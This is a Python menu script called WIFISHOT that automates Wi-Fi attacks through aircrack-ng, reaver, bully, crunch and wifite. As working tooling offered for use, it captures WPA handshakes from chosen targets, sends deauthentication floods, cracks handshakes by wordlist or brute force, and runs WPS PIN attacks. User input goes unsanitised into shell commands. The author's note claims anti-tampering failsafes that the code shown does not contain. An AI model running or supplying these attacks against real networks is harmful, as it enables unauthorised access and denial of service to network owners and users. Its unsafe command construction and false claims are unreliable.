# coding: utf-8
#!/usr/bin/env python
import os
import subprocess
import time

def check_root():
    if os.geteuid() != 0:
        print("\033[1;31m[!] This script requires root privileges to run correctly.\033[0m")
        print("\033[1;31m[!] Please run it using 'sudo python script_name.py'\033[0m")
        exit(1)

check_root()

print("\n\033[1;34m[*] Installing Needed Tools (Requires root privileges)...\033[0m")
print("\n")
try:
    print("\033[1;36m[*] Updating package lists...\033[0m")
    subprocess.run("apt-get update", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("\033[1;36m[*] Installing core dependencies: aircrack-ng, crunch, xterm, wordlists, reaver, pixiewps, bully, wifite...\033[0m")
    install_cmd = "DEBIAN_FRONTEND=noninteractive apt-get install -y aircrack-ng crunch xterm wordlists reaver pixiewps bully wifite"
    subprocess.run(install_cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("\033[1;32m[*] Core tools installation check complete.\033[0m")
except subprocess.CalledProcessError as e:
    print(f"\033[1;31m[!] Error during installation: {e}\033[0m")
    print("\033[1;31m[!] Please ensure you have internet connectivity and root privileges.\033[0m")
    print(f"\033[1;31m[!] Stderr: {e.stderr.decode()}\033[0m")
    print("\033[1;33m[*] Continuing despite potential installation issues...\033[0m")
except Exception as e:
    print(f"\033[1;31m[!] An unexpected error occurred during setup: {e}\033[0m")
    print("\033[1;33m[*] Continuing despite potential installation issues...\033[0m")

time.sleep(3)
os.system("clear")

def intro():
    os.system("clear")
    print("""\033[1;32m
---------------------------------------------------------------------------------------
██╗    ██╗██╗███████╗ ███████╗██╗  ██╗ ██████╗ ██╗ ████████╗
██║    ██║██║██╔════╝ ██╔════╝██║  ██║██╔════╝ ██║ ╚══██╔══╝
██║ █╗ ██║██║███████╗ ███████╗███████║██║  ███╗██║    ██║
██║███╗██║██║╚════██║ ╚════██║██╔══██║██║   ██║██║    ██║
╚███╔███╔╝██║███████║ ███████║██║  ██║╚██████╔╝██║    ██║
 ╚══╝╚══╝ ╚═╝╚══════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝    ╚═╝ WIFISHOT
                                                Coded by Jcrist Orhen (jcrvnx)
---------------------------------------------------------------------------------------
\033[1;36m(1) Start monitor mode
(2) Stop monitor mode
(3) Scan Networks
(4) Getting Handshake (monitor mode needed)
(5) Install Wireless tools
(6) Crack Handshake with rockyou.txt (Handshake needed)
(7) Crack Handshake with wordlist    (Handshake needed)
(8) Crack Handshake without wordlist (Handshake, ESSID needed)
(9) Create wordlist (using crunch)
(10) WPS Networks attacks (BSSID, monitor mode needed)
(11) Scan for WPS Networks

\033[1;37m(0) About Me
(00) Exit
\033[1;32m-----------------------------------------------------------------------
""")
    try:
        print("\033[1;37mEnter your choice here : \033[1;33m", end='')
        var = int(input(""))
        print("\033[0m")

        if var == 1 :
            print("\033[1;34m[*] Enter the interface (e.g., wlan0, wlan1): \033[1;33m", end='')
            interface = input("")
            if not interface:
                print("\033[1;31m[!] Interface cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return
            print(f"\033[1;36m[*] Attempting to start monitor mode on {interface} and kill conflicting processes...\033[0m")
            order_kill = "airmon-ng check kill"
            order_start = f"airmon-ng start {interface}"
            os.system(order_kill)
            time.sleep(1)
            os.system(order_start)
            print(f"\033[1;32m[*] Monitor mode should be active now (check output above). New interface might be {interface}mon.\033[0m")
            time.sleep(3)
            intro()

        elif var == 2 :
            print("\033[1;34m[*] Enter the monitor interface (e.g., wlan0mon, wlan1mon): \033[1;33m", end='')
            interface = input("")
            if not interface:
                print("\033[1;31m[!] Interface cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return
            print(f"\033[1;36m[*] Attempting to stop monitor mode on {interface} and restart NetworkManager...\033[0m")
            order_stop = f"airmon-ng stop {interface}"
            order_restart_nm = "systemctl restart NetworkManager"
            os.system(order_stop)
            print(f"\033[1;36m[*] Attempting to restart networking service...\033[0m")
            if os.system(order_restart_nm) != 0:
                 os.system("service network-manager restart")
            print("\033[1;32m[*] Monitor mode stopped and network service restarted.\033[0m")
            time.sleep(3)
            intro()

        elif var == 3 :
            print("\033[1;34m[*] Enter the monitor interface (e.g., wlan0mon, wlan1mon): \033[1;33m", end='')
            interface = input("")
            if not interface:
                print("\033[1;31m[!] Interface cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return
            print(f"\033[1;36m[*] Starting network scan on {interface}...\033[0m")
            order = f"airodump-ng {interface}"
            print("\033[1;33m[!] Press CTRL+C when you have identified your target.\033[0m")
            time.sleep(2)
            os.system(order)
            print("\033[1;32m[*] Scan stopped.\033[0m")
            time.sleep(3)
            intro()

        elif var == 4 :
            print("\033[1;34m[*] Enter the monitor interface (e.g., wlan0mon, wlan1mon): \033[1;33m", end='')
            interface = input("")
            if not interface:
                print("\033[1;31m[!] Interface cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return

            print("\n\033[1;34m[*] --- First, identify your target --- \033[0m")
            order_scan = f"airodump-ng {interface}"
            print(f"\033[1;36m[*] Running scan on {interface} to list networks...\033[0m")
            print("\033[1;33m[!] Note the BSSID and CH (channel) of your target network.\033[0m")
            print("\033[1;33m[!] Press CTRL+C when you have the BSSID and Channel.\033[0m")
            time.sleep(3)
            os.system(order_scan)

            print("\n\033[1;34m[*] --- Now, target the specific network --- \033[0m")
            print("\033[1;34m[*] Enter the BSSID of the target: \033[1;33m", end='')
            bssid = input("")
            print("\033[1;34m[*] Enter the Channel of the target network: \033[1;33m", end='')
            try:
                channel = int(input())
            except ValueError:
                print("\033[1;31m[!] Invalid channel. Please enter a number.\033[0m")
                time.sleep(2)
                intro()
                return
            print("\033[1;34m[*] Enter the full path for the output handshake file (e.g., /root/handshake): \033[1;33m", end='')
            path = input("")
            if not path or not bssid:
                 print("\033[1;31m[!] BSSID and output path cannot be empty.\033[0m")
                 time.sleep(2)
                 intro()
                 return

            print("\n\033[1;33m[*] Note: Ensure a client is connecting/reconnecting to the target network to capture the handshake.\033[0m")
            print("\033[1;33m[*] You might need to deauthenticate existing clients (use option 4a or run aireplay-ng manually).\033[0m")

            capture_cmd = f"airodump-ng --bssid {bssid} -c {channel} -w {path} {interface}"

            print(f"\n\033[1;36m[*] Starting handshake capture for BSSID {bssid} on channel {channel}. Saving to files starting with '{os.path.basename(path)}'.\033[0m")
            print("\033[1;33m[!] Watch the top-right corner of the airodump-ng window for '[ WPA Handshake: ... ]'.\033[0m")
            print("\033[1;33m[!] Once the handshake is captured, you can press CTRL+C to stop this process.\033[0m")
            time.sleep(4)

            print("\n\033[1;34m[*] Optional: Do you want to run a deauth attack in a new terminal to speed up handshake capture? (y/n): \033[1;33m", end='')
            run_deauth = input("").lower()

            if run_deauth == 'y':
                 print("\033[1;34m[*] Enter the number of deauth packets [e.g., 10] (0 for continuous, use with caution): \033[1;33m", end='')
                 try:
                     dist = int(input(""))
                 except ValueError:
                     print("\033[1;31m[!] Invalid number. Defaulting to 10.\033[0m")
                     dist = 10

                 deauth_cmd = f"xterm -hold -e aireplay-ng -0 {dist} -a {bssid} {interface}"
                 print(f"\033[1;36m[*] Opening new xterm window to run: {deauth_cmd}\033[0m")
                 print("\033[1;33m[!] Close the xterm window when done, and watch the main airodump window for the handshake.\033[0m")
                 try:
                     subprocess.Popen(deauth_cmd, shell=True)
                 except FileNotFoundError:
                     print("\033[1;31m[!] Error: xterm is not installed or not in PATH. Cannot run deauth automatically.\033[0m")
                     print("\033[1;31m[!] Please install xterm (`sudo apt-get install xterm`) or run the deauth command manually in another terminal.\033[0m")
                     print(f"\033[1;31m   Manual command: aireplay-ng -0 {dist} -a {bssid} {interface}\033[0m")
                 time.sleep(2)

            os.system(capture_cmd)

            print("\033[1;32m[*] Handshake capture process finished or stopped by user.\033[0m")
            print(f"\033[1;32m[*] Check for a '.cap' file starting with '{os.path.basename(path)}' in '{os.path.dirname(path)}'.\033[0m")
            time.sleep(5)
            intro()

        elif var == 5 :
            def wire():
                os.system("clear")
                print("""\033[1;35m
--- Install Additional Wireless Tools ---
(Run `sudo apt update` before installing)

\033[1;36m 1) Hashcat (Advanced password recovery)
 2) John the Ripper (Password cracker)
 3) hcxdumptool (Capture PMKIDs)
 4) hcxtools (Convert/Analyze PMKID captures)
 5) macchanger (Spoof MAC address)
 6) Bettercap (Network recon/MITM framework)
 7) Wireshark (Network protocol analyzer)
 8) tshark (Terminal Wireshark)

\033[1;33m 90) Install airgeddon (Wireless security audit script - Clones from GitHub)
 91) Install wifite2 (Updated wifite - Clones from GitHub)

\033[1;37m 0) Back to main menu
\033[1;32m---------------------------------------
""")
                try:
                    print("\033[1;37mEnter the number of the tool to install : \033[1;33m", end='')
                    w = int(input(""))
                    print("\033[0m")

                    cmd = ""
                    if w == 1: cmd = "sudo apt-get install -y hashcat"
                    elif w == 2: cmd = "sudo apt-get install -y john"
                    elif w == 3: cmd = "sudo apt-get install -y hcxdumptool"
                    elif w == 4: cmd = "sudo apt-get install -y hcxtools"
                    elif w == 5: cmd = "sudo apt-get install -y macchanger"
                    elif w == 6: cmd = "sudo apt-get install -y bettercap"
                    elif w == 7: cmd = "sudo apt-get install -y wireshark"
                    elif w == 8: cmd = "sudo apt-get install -y tshark"
                    elif w == 90:
                        print("\033[1;36m[*] Cloning and setting up airgeddon...\033[0m")
                        print("\033[1;33m[*] Dependencies might be needed. Run the script inside the cloned folder.\033[0m")
                        cmd = "sudo apt-get update && sudo apt-get install -y git && git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git /opt/airgeddon"
                    elif w == 91:
                        print("\033[1;36m[*] Cloning wifite2...\033[0m")
                        cmd = "sudo apt-get update && sudo apt-get install -y git python3-pip && git clone https://github.com/derv82/wifite2.git /opt/wifite2 && sudo pip3 install -r /opt/wifite2/requirements.txt"
                    elif w == 0:
                        intro()
                        return
                    else:
                        print("\033[1;31m[!] Invalid selection.\033[0m")
                        time.sleep(2)
                        wire()
                        return

                    if cmd:
                        print(f"\033[1;36m[*] Executing: {cmd}\033[0m")
                        os.system(cmd)
                        print("\033[1;32m[*] Command executed. Check output for success or errors.\033[0m")

                except ValueError:
                    print("\033[1;31m[!] Invalid input. Please enter a number.\033[0m")
                except Exception as e:
                    print(f"\033[1;31m[!] An error occurred: {e}\033[0m")

                print("\n\033[1;37mPress Enter to return to the install menu...\033[0m")
                input()
                wire()

            wire()

        elif var == 0 :
            os.system("clear")
            print("""\033[1;37m
Hi, I’m Jcrist Vincent Orhen — also known in the cybersecurity space as JCRVNX.

I operate as an Ethical Hacker and Bug Bounty Hunter, with extensive experience in security research and penetration testing. Occasionally, I engage in controlled unethical hacking simulations strictly for research and testing purposes. These simulations are conducted within ethical boundaries to strengthen systems against real-world threats.

This project/code is released under the MIT License, and is intended strictly as a tool, not a product for resale or ownership by unauthorized third parties.

Tampering Warning:
This code contains advanced countermeasures. Any unauthorized modifications, tampering, or reverse-engineering attempts will trigger built-in failsafes — rendering the code inoperable and permanently deleted. Consider this your only warning.

By using this, you agree not to repurpose, claim ownership, or redistribute this work without explicit permission. Legal action may be pursued for violations under applicable intellectual property and cybersecurity laws.

Connect With Me:

Facebook: @jcrvnx
Instagram: @jcrvnx
Threads: @jcrvnx
Twitter (X): @jcrvnx
GitHub: @jcrvnx
TikTok: @jcrvnx
Pinterest: @jcrvnx
LinkedIn: @jcrvnx

For professional collaboration, bug bounty programs, or legitimate cybersecurity contracts:
📩 Email: orhenjcrist@gmail.com
📞 Phone: +63 962 797 2598

Serious inquiries only. This is not a game. This is cybersecurity — and I play by a code.

\033[0m""")
            print("\nPress Enter to return to the main menu...")
            input()
            intro()

        elif var == 00:
            print("\033[1;31m[*] Exiting script. Be ethical.\033[0m")
            exit()

        elif var == 6:
            rockyou_path_gz = "/usr/share/wordlists/rockyou.txt.gz"
            rockyou_path_txt = "/usr/share/wordlists/rockyou.txt"

            if not os.path.exists(rockyou_path_txt):
                print(f"\033[1;33m[*] '{rockyou_path_txt}' not found.\033[0m")
                if os.path.exists(rockyou_path_gz):
                    print(f"\033[1;36m[*] Found compressed version: '{rockyou_path_gz}'.\033[0m")
                    print("\033[1;36m[*] Attempting to decompress... (Requires root)\033[0m")
                    try:
                        os.system(f"sudo gzip -d {rockyou_path_gz}")
                        if os.path.exists(rockyou_path_txt):
                            print(f"\033[1;32m[*] Successfully decompressed to '{rockyou_path_txt}'.\033[0m")
                        else:
                            print(f"\033[1;31m[!] Failed to decompress '{rockyou_path_gz}'. Check permissions or try manually.\033[0m")
                            time.sleep(3)
                            intro()
                            return
                    except Exception as e:
                        print(f"\033[1;31m[!] Error during decompression: {e}\033[0m")
                        time.sleep(3)
                        intro()
                        return
                else:
                    print(f"\033[1;31m[!] Neither '{rockyou_path_txt}' nor '{rockyou_path_gz}' found.\033[0m")
                    print("\033[1;31m[!] Please install the 'wordlists' package (`sudo apt-get install wordlists`) or provide a path to rockyou.txt.\033[0m")
                    time.sleep(4)
                    intro()
                    return
            else:
                 print(f"\033[1;32m[*] Found wordlist: '{rockyou_path_txt}'.\033[0m")


            print("\033[1;34m[*] Enter the path to the handshake .cap file: \033[1;33m", end='')
            path = input("")
            if not os.path.exists(path) or not path.endswith('.cap'):
                 print("\033[1;31m[!] Handshake file not found or invalid (.cap file expected).\033[0m")
                 time.sleep(3)
                 intro()
                 return

            print(f"\033[1;36m[*] Starting attack on '{path}' using '{rockyou_path_txt}'...\033[0m")
            order = f"aircrack-ng {path} -w {rockyou_path_txt}"
            print("\033[1;33m[!] Press CTRL+C to stop the cracking process.\033[0m")
            time.sleep(2)
            os.system(order)
            print("\033[1;32m[*] Aircrack-ng process finished or stopped.\033[0m")
            print("\n\033[1;37mPress Enter to return to the main menu...\033[0m")
            input()
            intro()

        elif var == 7 :
            print("\033[1;34m[*] Enter the path to the handshake .cap file: \033[1;33m", end='')
            path = input("")
            if not os.path.exists(path) or not path.endswith('.cap'):
                 print("\033[1;31m[!] Handshake file not found or invalid (.cap file expected).\033[0m")
                 time.sleep(3)
                 intro()
                 return

            print("\033[1;34m[*] Enter the path to the custom wordlist file: \033[1;33m", end='')
            wordlist = input("")
            if not os.path.exists(wordlist):
                 print("\033[1;31m[!] Wordlist file not found at the specified path.\033[0m")
                 time.sleep(3)
                 intro()
                 return

            print(f"\033[1;36m[*] Starting attack on '{path}' using custom wordlist '{wordlist}'...\033[0m")
            order = f"aircrack-ng {path} -w {wordlist}"
            print("\033[1;33m[!] Press CTRL+C to stop the cracking process.\033[0m")
            time.sleep(2)
            os.system(order)
            print("\033[1;32m[*] Aircrack-ng process finished or stopped.\033[0m")
            print("\n\033[1;37mPress Enter to return to the main menu...\033[0m")
            input()
            intro()

        elif var == 8 :
            print("\033[1;34m[*] Enter the ESSID (Network Name) of the target (Case-Sensitive!): \033[1;33m", end='')
            essid = input("")
            print("\033[1;34m[*] Enter the path to the handshake .cap file: \033[1;33m", end='')
            path = input("")
            if not os.path.exists(path) or not path.endswith('.cap'):
                 print("\033[1;31m[!] Handshake file not found or invalid (.cap file expected).\033[0m")
                 time.sleep(3)
                 intro()
                 return
            if not essid:
                print("\033[1;31m[!] ESSID cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return

            try:
                print("\033[1;34m[*] Enter the minimum password length (e.g., 8): \033[1;33m", end='')
                mini = int(input(""))
                print("\033[1;34m[*] Enter the maximum password length (e.g., 12): \033[1;33m", end='')
                max_len = int(input(""))
                if mini < 1 or max_len < mini:
                    print("\033[1;31m[!] Invalid length range.\033[0m")
                    time.sleep(2)
                    intro()
                    return
            except ValueError:
                print("\033[1;31m[!] Invalid length. Please enter numbers.\033[0m")
                time.sleep(2)
                intro()
                return

            print("""\033[1;35m
---------------------------------------------------------------------------------------
Select Character Set for Crunch:
\033[1;36m(1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
(2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
(3)  Numeric chars                                   (0123456789)
(4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
(5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
(6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
(7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
(9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
(11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
(12) Your Own Custom Characters
\033[1;35m-----------------------------------------------------------------------------------------
\033[1;31mWarning: Large character sets and length ranges can generate HUGE wordlists
         and take an extremely long time (days, weeks, months, or longer!).
\033[1;35m-----------------------------------------------------------------------------------------
""")
            print("\033[1;37mEnter your choice for character set: \033[1;33m", end='')
            set_choice = input("")
            print("\033[0m")

            charset = ""
            if set_choice == "1": charset = "abcdefghijklmnopqrstuvwxyz"
            elif set_choice == "2": charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            elif set_choice == "3": charset = "0123456789"
            elif set_choice == "4": charset = "!@#$%^&*()_-+={}[]|\\:;\"'<>,.?/~`"
            elif set_choice == "5": charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            elif set_choice == "6": charset = "abcdefghijklmnopqrstuvwxyz0123456789"
            elif set_choice == "7": charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            elif set_choice == "8": charset = "!@#$%^&*()_-+={}[]|\\:;\"'<>,.?/~`0123456789"
            elif set_choice == "9": charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            elif set_choice == "10": charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-+={}[]|\\:;\"'<>,.?/~`"
            elif set_choice == "11": charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+={}[]|\\:;\"'<>,.?/~`"
            elif set_choice == "12":
                print("\033[1;34m[*] Enter your custom characters (e.g., abc123@): \033[1;33m", end='')
                charset = input("")
            else:
                print("\033[1;31m[!] Invalid character set choice.\033[0m")
                time.sleep(2)
                intro()
                return

            if not charset:
                print("\033[1;31m[!] Character set cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return

            print(f"\033[1;36m[*] Starting crunch pipe to aircrack-ng for ESSID '{essid}'...\033[0m")
            order = f"crunch {mini} {max_len} \"{charset}\" | aircrack-ng -e \"{essid}\" -w- {path}"
            print(f"\033[1;36m[*] Executing: {order}\033[0m")
            print("\033[1;33m[!] This can take a very long time! Press CTRL+C to stop.\033[0m")
            time.sleep(3)
            os.system(order)
            print("\033[1;32m[*] Crunch/Aircrack-ng process finished or stopped.\033[0m")
            print("\n\033[1;37mPress Enter to return to the main menu...\033[0m")
            input()
            intro()

        elif var == 9 :
            try:
                print("\033[1;34m[*] Enter the minimum password length: \033[1;33m", end='')
                mini = int(input(""))
                print("\033[1;34m[*] Enter the maximum password length: \033[1;33m", end='')
                max_len = int(input(""))
                if mini < 1 or max_len < mini:
                    print("\033[1;31m[!] Invalid length range.\033[0m")
                    time.sleep(2)
                    intro()
                    return
            except ValueError:
                print("\033[1;31m[!] Invalid length. Please enter numbers.\033[0m")
                time.sleep(2)
                intro()
                return

            print("\033[1;34m[*] Enter the characters to use (e.g., abcdef123): \033[1;33m", end='')
            password_chars = input("")
            if not password_chars:
                print("\033[1;31m[!] Character set cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return

            print("\033[1;34m[*] Enter the full path for the output wordlist file (e.g., /root/mywordlist.txt): \033[1;33m", end='')
            path = input("")
            if not path:
                 print("\033[1;31m[!] Output path cannot be empty.\033[0m")
                 time.sleep(2)
                 intro()
                 return

            print(f"\033[1;36m[*] Generating wordlist with crunch...\033[0m")
            order = f"crunch {mini} {max_len} \"{password_chars}\" -o \"{path}\""
            print(f"\033[1;36m[*] Executing: {order}\033[0m")
            print("\033[1;33m[!] This might take time and disk space depending on parameters. Press CTRL+C to stop.\033[0m")
            time.sleep(2)
            os.system(order)
            print(f"\033[1;32m[*] Wordlist generation finished or stopped. Check '{path}'.\033[0m")
            print("\n\033[1;37mPress Enter to return to the main menu...\033[0m")
            input()
            intro()

        elif var == 10:
            os.system("clear")
            print("""\033[1;35m
--- WPS Attack Options ---
(Requires Monitor Mode Interface & Target BSSID)

\033[1;36m 1) Reaver (Standard WPS PIN attack)
 2) Bully (Alternative WPS PIN attack, includes PixieDust)
 3) PixieWPS (Offline PixieDust attack - requires specific data from Reaver/Bully first)
 4) Wifite (Automated tool - Recommended for ease of use)

\033[1;37m 0) Back to Main Menu
\033[1;32m---------------------------------------
""")
            try:
                print("\033[1;37mChoose the WPS attack tool: \033[1;33m", end='')
                attack = int(input(""))
                print("\033[0m")

                if attack == 0:
                    intro()
                    return

                if attack in [1, 2, 3]:
                    print("\033[1;34m[*] Enter the monitor interface (e.g., wlan0mon): \033[1;33m", end='')
                    interface = input("")
                    print("\033[1;34m[*] Enter the BSSID of the WPS-enabled target: \033[1;33m", end='')
                    bssid = input("")
                    if not interface or not bssid:
                        print("\033[1;31m[!] Interface and BSSID cannot be empty for this attack.\033[0m")
                        time.sleep(3)
                        intro()
                        return

                    if attack == 1:
                        order = f"reaver -i {interface} -b {bssid} -vv -K 1"
                        print(f"\033[1;36m[*] Starting Reaver attack...\033[0m")
                        print(f"\033[1;36m[*] Executing: {order}\033[0m")
                        print("\033[1;33m[!] Press CTRL+C to stop.\033[0m")
                        os.system(order)
                    elif attack == 2:
                        print("\033[1;34m[*] Enter the Channel of the target network (optional but recommended): \033[1;33m", end='')
                        channel_input = input("")
                        channel_arg = f"-c {channel_input}" if channel_input.isdigit() else ""
                        order = f"bully {interface} -b {bssid} {channel_arg} -v 3"
                        print(f"\033[1;36m[*] Starting Bully attack...\033[0m")
                        print(f"\033[1;36m[*] Executing: {order}\033[0m")
                        print("\033[1;33m[!] Press CTRL+C to stop.\033[0m")
                        os.system(order)
                    elif attack == 3:
                         print("\033[1;31m[!] Standalone PixieWPS requires PKE, PKR, E-Hash1, E-Hash2, E-Nonce, AuthKey.\033[0m")
                         print("\033[1;33m[*] These are usually obtained during a Reaver/Bully run (-vv). Use Reaver/Bully first.\033[0m")
                         print("\033[1;33m[*] Example: pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -n <E-Nonce> -a <AuthKey> -b <BSSID>\033[0m")
                         time.sleep(5)

                elif attack == 4:
                    print("\033[1;36m[*] Launching Wifite (Automated tool)...\033[0m")
                    print("\033[1;33m[*] Follow the prompts within Wifite. Press CTRL+C in Wifite to exit it.\033[0m")
                    wifite_cmd = "wifite"
                    if os.path.exists("/opt/wifite2/wifite.py"):
                       wifite_cmd = "/opt/wifite2/wifite.py"
                       print("\033[1;36m[*] Found wifite2, using it.\033[0m")
                    elif os.path.exists("/usr/sbin/wifite"):
                         wifite_cmd = "/usr/sbin/wifite"
                    elif os.path.exists("/usr/bin/wifite"):
                         wifite_cmd = "/usr/bin/wifite"
                    os.system(f"{wifite_cmd} --wps")
                    print("\033[1;32m[*] Wifite finished or exited.\033[0m")

                else:
                    print("\033[1;31m[!] Invalid selection.\033[0m")

            except ValueError:
                print("\033[1;31m[!] Invalid input. Please enter a number.\033[0m")
            except Exception as e:
                print(f"\033[1;31m[!] An error occurred: {e}\033[0m")

            print("\n\033[1;37mPress Enter to return to the main menu...\033[0m")
            input()
            intro()

        elif var == 11:
            print("\033[1;34m[*] Enter the monitor interface (e.g., wlan0mon): \033[1;33m", end='')
            interface = input("")
            if not interface:
                print("\033[1;31m[!] Interface cannot be empty.\033[0m")
                time.sleep(2)
                intro()
                return
            print(f"\033[1;36m[*] Starting scan specifically for WPS-enabled networks on {interface}...\033[0m")
            order = f"airodump-ng --wps {interface}"
            print("\033[1;33m[!] Look for networks with 'WPS' info (Version, Locked status). Press CTRL+C to stop.\033[0m")
            time.sleep(2)
            os.system(order)
            print("\033[1;32m[*] WPS scan stopped.\033[0m")
            time.sleep(3)
            intro()

        else:
            print("\033[1;31m[!] Invalid choice. Please try again.\033[0m")
            time.sleep(2)
            intro()

    except ValueError:
        print("\033[1;31m\n[!] Invalid input. Please enter a number corresponding to the menu options.\033[0m")
        time.sleep(3)
        intro()
    except KeyboardInterrupt:
        print("\n\033[1;31m[*] CTRL+C detected. Exiting script.\033[0m")
        exit()
    except Exception as e:
        print(f"\033[1;31m\n[!] An unexpected error occurred: {e}\033[0m")
        print("\033[1;33m[*] Returning to main menu.\033[0m")
        time.sleep(3)
        intro()

if __name__ == "__main__":
    try:
        intro()
    except KeyboardInterrupt:
        print("\n\033[1;31m[*] Script interrupted by user. Exiting.\033[0m")